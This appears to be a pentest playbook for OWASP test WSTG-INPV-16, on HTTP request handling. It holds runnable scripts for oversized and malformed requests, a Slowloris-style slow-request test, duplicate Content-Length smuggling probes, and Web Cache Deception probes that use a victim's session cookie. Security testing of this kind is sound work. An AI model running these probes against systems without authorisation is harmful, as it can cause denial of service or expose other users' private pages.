---
name: wstg-inpv-16
description: "Testing for HTTP Incoming Requests"
category: input-validation
owasp_id: WSTG-INPV-16
version: "1.0.0"
author: cyberstrike-official
tags: [injection, input-validation, xss, sqli, wstg, inpv]
tech_stack: []
cwe_ids: []
chains_with: [wstg-inpv-01, wstg-inpv-02]
prerequisites: [wstg-conf-01, wstg-conf-02]
severity_boost: {}
---

# wstg-inpv-16

## Test ID

WSTG-INPV-16

## Test Name

Testing for HTTP Incoming Requests

## High-Level Description

This test examines how applications handle incoming HTTP requests, including unusual methods, oversized headers, malformed requests, and protocol-level attacks. Proper handling prevents denial of service, information disclosure, and bypass of security controls.

---

## What to Check

- [ ] Oversized headers handling
- [ ] Malformed requests handling
- [ ] HTTP method handling
- [ ] Request body size limits
- [ ] Timeout handling
- [ ] Connection handling

---

## How to Test

### Step 1: Test Request Handling

```bash
#!/bin/bash
TARGET="https://target.com"

echo "[*] Testing HTTP Incoming Request Handling..."

# Oversized header
curl -s -I "$TARGET" \
    -H "X-Oversized: $(python3 -c 'print("A"*8000)')" 2>&1 | head -5

# Multiple same headers
curl -s -I "$TARGET" \
    -H "X-Test: value1" \
    -H "X-Test: value2" \
    -H "X-Test: value3" | head -10

# Malformed HTTP version
echo -e "GET / HTTP/9.9\r\nHost: $TARGET\r\n\r\n" | nc -v $TARGET 80

# Long URI
curl -s "$TARGET/$(python3 -c 'print("A"*4000)')" 2>&1 | head -5
```

### Step 2: HTTP Request Handler Tester

```python
#!/usr/bin/env python3
"""
HTTP Incoming Request Handler Tester
"""

import socket
import ssl
import time
from urllib.parse import urlparse

class HTTPRequestTester:
    def __init__(self, url):
        self.url = url
        self.parsed = urlparse(url)
        self.host = self.parsed.netloc.split(':')[0]
        self.port = 443 if self.parsed.scheme == 'https' else 80
        self.findings = []

    def send_raw(self, data, timeout=10):
        """Send raw data to server"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(timeout)

            if self.parsed.scheme == 'https':
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=self.host)

            sock.connect((self.host, self.port))
            sock.send(data.encode() if isinstance(data, str) else data)

            response = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
            except socket.timeout:
                pass

            sock.close()
            return response.decode('utf-8', errors='ignore')

        except Exception as e:
            return f"Error: {str(e)}"

    def test_oversized_headers(self):
        """Test handling of oversized headers"""
        print("\n[*] Testing oversized header handling...")

        sizes = [1000, 4000, 8000, 16000, 32000]

        for size in sizes:
            header_value = "A" * size
            request = f"""GET / HTTP/1.1\r
Host: {self.host}\r
X-Oversized: {header_value}\r
\r
"""
            response = self.send_raw(request)

            if 'HTTP/1.1 413' in response:
                print(f"  [OK] {size} bytes: 413 Request Entity Too Large")
            elif 'HTTP/1.1 431' in response:
                print(f"  [OK] {size} bytes: 431 Request Header Fields Too Large")
            elif 'HTTP/1.1 400' in response:
                print(f"  [OK] {size} bytes: 400 Bad Request")
            elif 'HTTP/1.' in response:
                print(f"  [INFO] {size} bytes: Accepted")
            else:
                print(f"  [WARN] {size} bytes: Unexpected response")

    def test_long_uri(self):
        """Test handling of long URIs"""
        print("\n[*] Testing long URI handling...")

        sizes = [1000, 2000, 4000, 8000, 16000]

        for size in sizes:
            long_path = "/" + "A" * size
            request = f"""GET {long_path} HTTP/1.1\r
Host: {self.host}\r
\r
"""
            response = self.send_raw(request)

            if 'HTTP/1.1 414' in response:
                print(f"  [OK] {size} char URI: 414 URI Too Long")
            elif 'HTTP/1.1 400' in response:
                print(f"  [OK] {size} char URI: 400 Bad Request")
            elif 'HTTP/1.' in response:
                print(f"  [INFO] {size} char URI: Accepted")

    def test_malformed_requests(self):
        """Test handling of malformed requests"""
        print("\n[*] Testing malformed request handling...")

        malformed_requests = [
            ("GET / HTTP/9.9\r\nHost: {host}\r\n\r\n", "Invalid HTTP version"),
            ("INVALID / HTTP/1.1\r\nHost: {host}\r\n\r\n", "Invalid method"),
            ("GET /\r\nHost: {host}\r\n\r\n", "Missing HTTP version"),
            ("GET / HTTP/1.1\r\n\r\n", "Missing Host header"),
            ("GET / HTTP/1.1\r\nHost:\r\n\r\n", "Empty Host header"),
            ("GET HTTP/1.1\r\nHost: {host}\r\n\r\n", "Missing path"),
            ("\x00GET / HTTP/1.1\r\nHost: {host}\r\n\r\n", "Null byte prefix"),
        ]

        for request_template, description in malformed_requests:
            request = request_template.format(host=self.host)
            response = self.send_raw(request)

            if 'HTTP/1.1 400' in response or 'HTTP/1.1 505' in response:
                print(f"  [OK] {description}: Properly rejected")
            elif 'HTTP/1.1 200' in response:
                print(f"  [WARN] {description}: Accepted (possible issue)")
                self.findings.append({
                    'type': 'Malformed Request Accepted',
                    'description': description,
                    'severity': 'Low'
                })
            else:
                print(f"  [INFO] {description}: {response[:50]}")

    def test_duplicate_headers(self):
        """Test handling of duplicate headers"""
        print("\n[*] Testing duplicate header handling...")

        # Multiple Host headers (potential smuggling vector)
        request = f"""GET / HTTP/1.1\r
Host: {self.host}\r
Host: evil.com\r
\r
"""
        response = self.send_raw(request)
        print(f"  Multiple Host headers: {'Rejected' if '400' in response else 'Accepted'}")

        # Multiple Content-Length
        request = f"""POST / HTTP/1.1\r
Host: {self.host}\r
Content-Length: 10\r
Content-Length: 20\r
\r
1234567890"""

        response = self.send_raw(request)
        if '400' in response:
            print(f"  [OK] Multiple Content-Length: Rejected")
        else:
            print(f"  [WARN] Multiple Content-Length: Accepted")
            self.findings.append({
                'type': 'Duplicate Headers Accepted',
                'header': 'Content-Length',
                'severity': 'Medium'
            })

    def test_slow_request(self):
        """Test slow HTTP request handling (Slowloris-style)"""
        print("\n[*] Testing slow request handling...")

        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(60)

            if self.parsed.scheme == 'https':
                context = ssl.create_default_context()
                sock = context.wrap_socket(sock, server_hostname=self.host)

            sock.connect((self.host, self.port))

            # Send partial request
            sock.send(f"GET / HTTP/1.1\r\nHost: {self.host}\r\n".encode())

            # Wait and send more
            start_time = time.time()
            for i in range(10):
                time.sleep(2)
                sock.send(b"X-Header: value\r\n")
                elapsed = time.time() - start_time

                if elapsed > 15:
                    print(f"  [INFO] Connection maintained for {elapsed:.0f}s")
                    break

            sock.close()

            if elapsed > 10:
                print(f"  [WARN] Server allows slow requests (potential DoS)")
                self.findings.append({
                    'type': 'Slow Request Allowed',
                    'duration': elapsed,
                    'severity': 'Medium'
                })

        except socket.timeout:
            print(f"  [OK] Connection timed out properly")
        except Exception as e:
            print(f"  [INFO] {str(e)}")

    def test_large_body(self):
        """Test large request body handling"""
        print("\n[*] Testing large body handling...")

        sizes = [(1024, "1KB"), (1024*1024, "1MB"), (10*1024*1024, "10MB")]

        for size, label in sizes:
            body = "A" * size
            request = f"""POST / HTTP/1.1\r
Host: {self.host}\r
Content-Type: application/x-www-form-urlencoded\r
Content-Length: {len(body)}\r
\r
{body}"""

            response = self.send_raw(request, timeout=30)

            if '413' in response:
                print(f"  [OK] {label}: 413 Payload Too Large")
                break
            elif '400' in response or '500' in response:
                print(f"  [INFO] {label}: Rejected with error")
            else:
                print(f"  [INFO] {label}: Accepted")

    def generate_report(self):
        """Generate findings report"""
        print("\n" + "="*60)
        print("HTTP REQUEST HANDLING REPORT")
        print("="*60)

        if not self.findings:
            print("\nNo significant issues found.")
        else:
            for f in self.findings:
                print(f"\n[{f['severity']}] {f['type']}")
                if 'description' in f:
                    print(f"  Description: {f['description']}")

    def run_tests(self):
        """Run all tests"""
        self.test_oversized_headers()
        self.test_long_uri()
        self.test_malformed_requests()
        self.test_duplicate_headers()
        self.test_slow_request()
        self.test_large_body()
        self.generate_report()

# Usage
tester = HTTPRequestTester("https://target.com")
tester.run_tests()
```

---

## Tools

| Tool         | Purpose               |
| ------------ | --------------------- |
| curl         | Basic testing         |
| netcat       | Raw request sending   |
| slowhttptest | Slow HTTP DoS testing |

---

## Example Commands/Payloads

```bash
# Oversized header
curl -s -o /dev/null -w "%{http_code}\n" "https://{target}/" -H "X-Test: $(python3 -c 'print("A"*16000)')"

# Long URI
curl -s -o /dev/null -w "%{http_code}\n" "https://{target}/$(python3 -c 'print("A"*8000)')"

# Malformed request line via raw socket
printf 'GET / HTTP/9.9\r\nHost: {target}\r\n\r\n' | nc {target} 80

# Duplicate Content-Length headers (smuggling precursor)
printf 'POST / HTTP/1.1\r\nHost: {target}\r\nContent-Length: 10\r\nContent-Length: 20\r\n\r\n1234567890' | nc {target} 80
```

| Payload | Technique | Detection Pattern |
| --- | --- | --- |
| 8-32KB header value | Oversized header handling | Expect `400`/`413`/`431`; a `200` indicates no limit enforced |
| 4-16KB URI path | Long URI handling | Expect `414`; a `200` indicates no limit |
| `HTTP/9.9` version string | Malformed protocol version | Expect `400`/`505`; a `200` is a finding |
| Duplicate `Content-Length` headers | Ambiguous request framing | Expect `400`; acceptance is a smuggling precursor |

### Web Cache Deception (from PayloadsAllTheThings)

A distinct request-handling flaw from raw protocol abuse above: the cache and the origin server disagree on where a dynamic path ends and a static-looking suffix begins, letting an attacker get a victim's private page cached under a guessable, publicly-fetchable URL.

```bash
# Path-confusion probe: append a static-looking segment after a private/authenticated path
curl -s -b "session={victim_session}" "https://{target}/myaccount/home/nonexistent.css"
# If the cache stores this response keyed by the full URL, a second unauthenticated request
# for the SAME url returns the victim's cached account page:
curl -s "https://{target}/myaccount/home/nonexistent.css"

# Delimiter discrepancy: origin treats ';' as a path-segment separator, cache doesn't
curl -s -b "session={victim_session}" "https://{target}/settings/profile;script.js"

# Path-normalization discrepancy: origin resolves the traversal, cache caches the literal path
curl -s -b "session={victim_session}" "https://{target}/private/..%2fprofile"
```

Detection pattern: request the crafted URL twice — once with a valid session (primes the cache) and once with no session/cookies at all. If the second, unauthenticated request returns the first request's private content (and a cache-hit header like `X-Cache: HIT`/`CF-Cache-Status: HIT`), the endpoint is vulnerable to Web Cache Deception (CWE-524). Also check un-keyed inputs (`X-Forwarded-Host`, `X-Forwarded-Scheme`, `X-Original-URL`) for cache poisoning of injected content rather than just page disclosure.

---

## Remediation

```nginx
# Nginx - Request limits
client_max_body_size 10m;
client_header_buffer_size 1k;
large_client_header_buffers 4 8k;
client_body_timeout 10s;
client_header_timeout 10s;
```

```apache
# Apache - Request limits
LimitRequestBody 10485760
LimitRequestFields 100
LimitRequestFieldSize 8190
LimitRequestLine 8190
Timeout 60
```

---

## Risk Assessment

| Finding                      | CVSS | Severity |
| ---------------------------- | ---- | -------- |
| No request size limits       | 5.3  | Medium   |
| Slow HTTP DoS possible       | 5.3  | Medium   |
| Malformed request acceptance | 4.3  | Medium   |

---

## CWE Categories

| CWE ID      | Title                             |
| ----------- | --------------------------------- |
| **CWE-400** | Uncontrolled Resource Consumption |


---

## References

- [OWASP WSTG - WSTG-INPV-16: Testing for HTTP Incoming Requests](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_HTTP_Incoming_Requests)
- [PayloadsAllTheThings - Web Cache Deception](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Web%20Cache%20Deception)

---

## Checklist

```
[ ] Oversized headers tested
[ ] Long URIs tested
[ ] Malformed requests tested
[ ] Duplicate headers tested
[ ] Slow requests tested
[ ] Large body tested
[ ] Findings documented
```
